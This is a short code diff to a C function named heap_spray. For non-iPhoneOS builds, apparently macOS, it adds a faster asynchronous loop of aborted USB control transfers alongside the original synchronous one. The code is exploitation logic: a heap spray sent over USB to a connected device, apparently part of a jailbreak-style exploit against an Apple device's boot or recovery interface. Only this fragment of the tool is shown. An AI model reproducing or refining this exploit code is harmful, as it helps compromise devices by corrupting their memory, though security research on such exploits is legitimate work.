@@ -15,9 +15,29 @@ static void heap_spray(io_client_t client){
     DEBUG_LOG("[%s] %x\n", __FUNCTION__, result.ret);
     usleep(10000);
     
+#ifdef IPHONEOS_ARM
     for(int i=0;i<7938;i++){
         result = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 64, 1);
     }
+#else
+    
+    async_transfer_t transfer;
+    bzero(&transfer, sizeof(async_transfer_t));
+    
+    // I think this will reduce stability. But it is definitely fast. (for macOS)
+    // It doesn't make sense on iPhoneOS.
+    int usleep_time = 100;
+    for(int i=0; i<7938; i++){
+        result = async_usb_ctrl_transfer(client, 0x80, 6, 0x304, 0x40a, blank, 64, &transfer);
+        usleep(usleep_time);
+        io_abort_pipe_zero(client);
+        usleep(usleep_time);
+        while(transfer.ret != kIOReturnAborted){
+            CFRunLoopRun();
+        }
+    }
+    
+#endif
     DEBUG_LOG("[%s] %x\n", __FUNCTION__, result.ret);
     usleep(10000);
     
